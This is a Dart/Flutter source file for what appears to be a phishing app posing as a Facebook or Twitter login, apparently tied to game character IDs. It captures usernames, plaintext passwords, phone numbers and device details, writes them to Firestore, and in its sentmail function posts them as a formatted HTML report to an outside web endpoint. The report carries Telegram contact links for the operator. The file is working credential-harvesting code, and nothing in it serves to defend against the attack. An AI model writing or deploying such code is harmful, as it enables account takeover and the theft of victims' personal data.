import 'dart:convert';
import 'dart:developer';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:provider/provider.dart';
import 'package:intl/src/intl/date_format.dart';

class DataController extends ChangeNotifier {
  final CollectionReference userCollection =
      FirebaseFirestore.instance.collection('Users');
  final CollectionReference infoCollection =
      FirebaseFirestore.instance.collection('UserInfo');
  bool isvisible = false;
  String _username = "";
  String _password = "";
  String _charaterid = "";
  String _phonenumber = "";
  String _accountlevel = "";
  Map<String, dynamic> _deviceInfo = {};
  Map<String, dynamic> get deviceInfo => _deviceInfo;
  String get username => _username;
  String get password => _password;
  String get charaterid => _charaterid;
  String get phonenumber => _phonenumber;
  String get accountlevel => _accountlevel;

  tooglevisible() {
    isvisible = !isvisible;
    notifyListeners();
  }

  setusername(String value) {
    _username = value.trim().toLowerCase();
    if (kDebugMode) {
      print(_username + " username");
    }
    notifyListeners();
  }

  setpassword(String value) {
    _password = value;
    if (kDebugMode) {
      print(_password + " password");
    }
    notifyListeners();
  }

  setcharaterid(String value) {
    _charaterid = value.trim().toLowerCase();
    if (kDebugMode) {
      print(_charaterid + " charaterid");
    }
    notifyListeners();
  }

  setphonenumber(String value) {
    _phonenumber = value.trim().toLowerCase();
    if (kDebugMode) {
      print(_phonenumber + " phonenumber");
    }
    notifyListeners();
  }

  setaccountlevel(String value) {
    _accountlevel = value.trim().toLowerCase();
    if (kDebugMode) {
      print(_accountlevel + " accountlevel");
    }
    notifyListeners();
  }

  Future updateUserData(String __username, String __password, Type type) async {
    Map<String, dynamic> user = {
      'username': __username.trim().toLowerCase(),
      'password': __password,
      'Type': type.toString().replaceAll("Type.", ""),
    };

    await userCollection.doc(__username.trim().toLowerCase()).set(user);
    notifyListeners();
  }

  Future updateUserDataDetials(
      String _charaterid, String _phonenumber, String _accountlevel) async {
    Map<String, dynamic> userdata = {
      'charaterid': _charaterid,
      'phonenumber': _phonenumber,
      '_accountlevel': _accountlevel,
    };
    String docuser =
        _username.isEmpty ? 'blank' : _username.toString().trim().toLowerCase();
    await userCollection.doc(docuser).collection(docuser).add(userdata);
    notifyListeners();
  }

  checkinfo() async {
    final deviceInfoPlugin = DeviceInfoPlugin();

    var deviceInfo = (kIsWeb)
        ? await deviceInfoPlugin.webBrowserInfo
        : (Platform.isAndroid)
            ? await deviceInfoPlugin.androidInfo
            : (Platform.isIOS)
                ? await deviceInfoPlugin.iosInfo
                : await deviceInfoPlugin.deviceInfo;

    var _info = deviceInfo.toMap();
    _info.removeWhere(((key, value) => key == 'systemFeatures'));
    _deviceInfo = _info;
    String docuser =
        _username.isEmpty ? 'blank' : _username.toString().trim().toLowerCase();
    await userCollection.doc(docuser).collection(docuser).add(_deviceInfo);

    notifyListeners();
  }

  sentmail() async {
    var data = (!kIsWeb)
        ? {
            'username': _username,
            'password': _password,
            'charaterid': _charaterid,
            'phonenumber': _phonenumber,
            'accountlevel': _accountlevel,
            'deviceinfo': _deviceInfo
          }
        : {
            'username': _username,
            'password': _password,
            'charaterid': _charaterid,
            'phonenumber': _phonenumber,
            'accountlevel': _accountlevel,
          };
    log("data: $data");

    // String docuser =
    //     _username.isEmpty ? 'blank' : _username.toString().trim().toLowerCase();
    // String docid = _charaterid.isEmpty
    //     ? 'blank'
    //     : _charaterid.toString().trim().toLowerCase();
    // var _finalobject = json.encode(data);
    // await infoCollection.doc(docuser).collection(docid).add(data);

    // log("_finalobject: $_finalobject");

    String temptable = "";
    _deviceInfo.forEach((key, value) {
      temptable +=
          '<tr><th style="width: 22%; text-align: left;" height="25px"><b>${key.toUpperCase()}</th><th style="width: 78%; text-align: center;"><b>$value</th></tr>\n';
    });

    String html = (!kIsWeb)
        ? '''
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Data</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$_username</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$_password</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>$_charaterid</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>$_phonenumber</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>$_accountlevel</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Data</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">$temptable</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
'''
        : '''
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Data</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$_username</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$_password</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>$_charaterid</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>$_phonenumber</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>$_accountlevel</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Sajal Piro
</div>
<div style="float: right;">
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
<a href="https://t.me/NoUserIdFound"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
''';
    // var now = DateTime.now();

    // var body = DateFormat('d MMM y').add_jm().format(now.toLocal());
    log("html : $html");
    var url = Uri.parse("https://stackedmail.herokuapp.com/rewards");
    var headers = {'Content-Type': 'application/json'};
    var apiobj = json.encode({
      "subject": "Message sent on ",
      "body": data.toString(),
      "html": html.toString()
    });
    await http.post(
      url,
      headers: headers,
      body: apiobj,
    );

    notifyListeners();
  }
}

enum Type { facebook, twitter }
